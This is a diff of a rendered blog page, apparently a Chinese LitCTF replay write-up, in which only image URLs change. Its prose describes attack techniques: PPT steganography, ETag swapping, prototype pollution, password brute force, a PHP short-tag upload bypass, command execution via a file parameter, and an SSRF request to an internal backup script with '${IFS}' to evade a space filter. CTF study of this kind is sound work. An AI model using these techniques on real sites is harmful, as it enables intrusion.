-&lt;p&gt;​	&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604224739082.png&#34;
+&lt;p&gt;​	&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604224739082.png&#34;
 	width=&#34;1678&#34;
 	height=&#34;924&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604224739082_hu7181406284639026553.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604224739082_hu7436127890005250632.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604224739082_hu7181406284639026553.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604224739082_hu7436127890005250632.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250604224739082&#34;
@@ -951,10 +951,10 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;​	是个换表base，给了密文，只要找到映射表就行。&lt;/p&gt;
 &lt;p&gt;​	然后，ppt的自动换片间隔里有0和1隐写，在/ppt/slides/slide?.xml的advTm字段里，可以写脚本提出来&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604225833933.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604225833933.png&#34;
 	width=&#34;927&#34;
 	height=&#34;719&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604225833933_hu7331516348781313488.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604225833933_hu6748897577927905879.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604225833933_hu7331516348781313488.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604225833933_hu6748897577927905879.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250604225833933&#34;
@@ -965,10 +965,10 @@
 		data-flex-basis=&#34;309px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230217256.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230217256.png&#34;
 	width=&#34;1016&#34;
 	height=&#34;438&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230217256_hu8017721276434597953.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230217256_hu9047117013299241112.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230217256_hu8017721276434597953.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230217256_hu9047117013299241112.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250604230217256&#34;
@@ -979,10 +979,10 @@
 		data-flex-basis=&#34;556px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230301145.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230301145.png&#34;
 	width=&#34;1104&#34;
 	height=&#34;540&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230301145_hu11759403959032265584.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230301145_hu12334725268161310786.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230301145_hu11759403959032265584.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230301145_hu12334725268161310786.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250604230301145&#34;
@@ -1102,10 +1102,10 @@
 &lt;/div&gt;&lt;p&gt;​	1000换成1，0不变，得到&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;10000111000101110010011000111110111111011010110101110101100111011011011101100110101110010101110100111001111100101110001110000110101100111001011001101111010110111100001011110101111001111100001101100110101011010010110011011000101011110001101110000011000011011100101011100110110011001001011110101011010011001000110011111001101000100100000111000101010101110010110101001010011100111110100101010001101000011011111001001110100010001110111000011001001100010101111&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;​	然后解码一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230437408.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230437408.png&#34;
 	width=&#34;1446&#34;
 	height=&#34;883&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230437408_hu12764590207468614478.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230437408_hu11685058643713858368.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230437408_hu12764590207468614478.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230437408_hu11685058643713858368.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250604230437408&#34;
@@ -1116,10 +1116,10 @@
 		data-flex-basis=&#34;393px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230540228.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230540228.png&#34;
 	width=&#34;1546&#34;
 	height=&#34;839&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230540228_hu7024391608230374941.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230540228_hu6702847860089247465.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230540228_hu7024391608230374941.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230540228_hu6702847860089247465.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250604230540228&#34;
@@ -1132,10 +1132,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;​	居然不是flag，看来还有别的东西&lt;/p&gt;
 &lt;p&gt;​	找到ppt中的图片image2，发现藏了zip，密码应该就是base解出来的东西&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230752626.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230752626.png&#34;
 	width=&#34;962&#34;
 	height=&#34;447&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230752626_hu12265832805013363489.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230752626_hu222465338581892957.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230752626_hu12265832805013363489.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230752626_hu222465338581892957.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250604230752626&#34;
@@ -1146,10 +1146,10 @@
 		data-flex-basis=&#34;516px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230742523.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230742523.png&#34;
 	width=&#34;1187&#34;
 	height=&#34;679&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230742523_hu11774049218213574117.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230742523_hu1379037388419713197.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230742523_hu11774049218213574117.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604230742523_hu1379037388419713197.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250604230742523&#34;
@@ -1161,10 +1161,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	打开后战斗还未结束&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604231137013.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604231137013.png&#34;
 	width=&#34;1404&#34;
 	height=&#34;1020&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604231137013_hu11558717314955634769.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604231137013_hu11152929944353603528.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604231137013_hu11558717314955634769.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604231137013_hu11152929944353603528.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250604231137013&#34;
@@ -1176,10 +1176,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	不过也很简单了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604231256730.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604231256730.png&#34;
 	width=&#34;955&#34;
 	height=&#34;719&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604231256730_hu15654931632569705618.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604231256730_hu6935906350455467838.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604231256730_hu15654931632569705618.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604231256730_hu6935906350455467838.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250604231256730&#34;
@@ -1207,10 +1207,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;​	复现很简单，直接打进去就行（多试几次，可能会比较卡），可以发现新的ETag&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529114800851.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529114800851.png&#34;
 	width=&#34;2033&#34;
 	height=&#34;746&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529114800851_hu647204298096413205.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529114800851_hu11357895802560630394.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529114800851_hu647204298096413205.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529114800851_hu11357895802560630394.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250529114800851&#34;
@@ -1222,10 +1222,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	将etag替换，访问/dashboard&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529115218345.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529115218345.png&#34;
 	width=&#34;2027&#34;
 	height=&#34;573&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529115218345_hu8394508170358901425.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529115218345_hu11514085543176395339.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529115218345_hu8394508170358901425.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529115218345_hu11514085543176395339.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250529115218345&#34;
@@ -1242,10 +1242,10 @@
 &lt;h3 id=&#34;多重宇宙日记&#34;&gt;多重宇宙日记
 &lt;/h3&gt;&lt;h4 id=&#34;知识点简单原型链污染&#34;&gt;知识点：简单原型链污染
 &lt;/h4&gt;&lt;p&gt;​	注册后在个人资料可以看到源码，是原型链污染&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529130428337.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529130428337.png&#34;
 	width=&#34;1271&#34;
 	height=&#34;1131&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529130428337_hu12408673942951725020.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529130428337_hu8266924394013672415.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529130428337_hu12408673942951725020.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529130428337_hu8266924394013672415.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250529130428337&#34;
@@ -1282,10 +1282,10 @@
 &lt;h3 id=&#34;easy_file&#34;&gt;easy_file
 &lt;/h3&gt;&lt;h4 id=&#34;知识点弱密码爆破简单文件上传文件读取&#34;&gt;知识点：弱密码爆破、简单文件上传+文件读取
 &lt;/h4&gt;&lt;p&gt;​	又是一个登陆界面，查看源码后发现有个file查看头像，先不管我们上传内容抓包&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529145355997.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529145355997.png&#34;
 	width=&#34;1668&#34;
 	height=&#34;1177&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529145355997_hu10096683893570451983.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529145355997_hu18282952777577415457.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529145355997_hu10096683893570451983.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529145355997_hu18282952777577415457.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250529145355997&#34;
@@ -1297,10 +1297,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	发现被编码了，我们尝试爆破&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529145921860.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529145921860.png&#34;
 	width=&#34;1156&#34;
 	height=&#34;816&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529145921860_hu3749569241214344280.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529145921860_hu9157370595786901811.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529145921860_hu3749569241214344280.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529145921860_hu9157370595786901811.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250529145921860&#34;
@@ -1313,10 +1313,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;​	得到admin/password&lt;/p&gt;
 &lt;p&gt;​	然后是文件上传，直接上传（有个短标签绕过）&amp;lt;?php  换成&amp;lt;?就行&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529151407355.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529151407355.png&#34;
 	width=&#34;866&#34;
 	height=&#34;295&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529151407355_hu17893801821856189382.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529151407355_hu2169757224615239162.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529151407355_hu17893801821856189382.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529151407355_hu2169757224615239162.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250529151407355&#34;
@@ -1328,10 +1328,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	还记得那个file查看头像吗，用flie查看头像，并传入命令即可&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529152328076.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529152328076.png&#34;
 	width=&#34;1338&#34;
 	height=&#34;1076&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529152328076_hu9981028470653430758.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529152328076_hu7140207603976548696.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529152328076_hu9981028470653430758.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529152328076_hu7140207603976548696.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250529152328076&#34;
@@ -1342,10 +1342,10 @@
 		data-flex-basis=&#34;298px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529152454281.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529152454281.png&#34;
 	width=&#34;1083&#34;
 	height=&#34;1117&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529152454281_hu16458274085341684678.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529152454281_hu16807887743705465930.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529152454281_hu16458274085341684678.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250529152454281_hu16807887743705465930.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250529152454281&#34;
@@ -1358,10 +1358,10 @@
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;easy_signin&#34;&gt;easy_signin
 &lt;/h3&gt;&lt;h4 id=&#34;知识点时间戳md5爆破easy_ssrf&#34;&gt;知识点：（时间戳+md5）爆破、easy_ssrf
-&lt;/h4&gt;&lt;p&gt;​	&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601201145781.png&#34;
+&lt;/h4&gt;&lt;p&gt;​	&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601201145781.png&#34;
 	width=&#34;1532&#34;
 	height=&#34;376&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601201145781_hu2303110995835842834.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601201145781_hu9712675561476606197.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601201145781_hu2303110995835842834.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601201145781_hu9712675561476606197.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250601201145781&#34;
@@ -1384,10 +1384,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	发现login.html，查看其源代码，有两点，第一点是发现用户名和密码被md5加密了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601201727317.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601201727317.png&#34;
 	width=&#34;1762&#34;
 	height=&#34;1107&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601201727317_hu13349309243743164426.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601201727317_hu10060251910585144350.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601201727317_hu13349309243743164426.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601201727317_hu10060251910585144350.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250601201727317&#34;
@@ -1399,10 +1399,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	第二点是在api.js可以发现**&lt;code&gt;/api/sys/urlcode.php?url=&lt;/code&gt;**这里明显是ssrf&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601204125258.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601204125258.png&#34;
 	width=&#34;1115&#34;
 	height=&#34;338&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601204125258_hu18047807472374733091.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601204125258_hu18417924039611551643.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601204125258_hu18047807472374733091.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601204125258_hu18417924039611551643.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250601204125258&#34;
@@ -1607,10 +1607,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;​	记得让ai搞出请求头消息&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213021008.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213021008.png&#34;
 	width=&#34;1255&#34;
 	height=&#34;725&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213021008_hu9014730421801064593.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213021008_hu15611656983765862320.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213021008_hu9014730421801064593.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213021008_hu15611656983765862320.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250601213021008&#34;
@@ -1621,10 +1621,10 @@
 		data-flex-basis=&#34;415px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213544788.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213544788.png&#34;
 	width=&#34;2089&#34;
 	height=&#34;762&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213544788_hu5355431507727735427.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213544788_hu13964454491024416669.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213544788_hu5355431507727735427.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213544788_hu13964454491024416669.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250601213544788&#34;
@@ -1636,10 +1636,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	然后就可以进入dashboard.php了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213751983.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213751983.png&#34;
 	width=&#34;1512&#34;
 	height=&#34;561&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213751983_hu9627265476079327342.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213751983_hu10197696988042547581.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213751983_hu9627265476079327342.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601213751983_hu10197696988042547581.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250601213751983&#34;
@@ -1659,10 +1659,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/api/sys/urlcode.php?url=127.0.0.1/backup/8e0132966053d4bf8b2dbe4ede25502b.php
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214010050.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214010050.png&#34;
 	width=&#34;1493&#34;
 	height=&#34;995&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214010050_hu8156073740008764606.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214010050_hu12618339617286386491.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214010050_hu8156073740008764606.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214010050_hu12618339617286386491.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250601214010050&#34;
@@ -1674,10 +1674,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;空格被过滤了，用${IFS}绕。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214638378.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214638378.png&#34;
 	width=&#34;1573&#34;
 	height=&#34;1000&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214638378_hu7993321471651173480.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214638378_hu17770688708744733081.png 1024w&#34;
